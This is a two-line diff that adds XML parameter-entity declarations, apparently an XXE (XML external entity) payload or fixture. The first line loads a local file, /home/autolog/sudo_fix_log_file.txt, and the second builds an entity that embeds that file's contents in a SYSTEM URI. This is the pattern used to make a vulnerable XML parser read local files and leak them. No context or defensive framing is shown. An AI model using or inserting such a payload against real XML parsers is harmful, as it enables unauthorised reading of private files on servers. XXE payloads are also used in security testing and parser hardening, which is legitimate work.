@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "file:///home/autolog/sudo_fix_log_file.txt">
+<!ENTITY % ent "<!ENTITY data SYSTEM ':%file;'>">
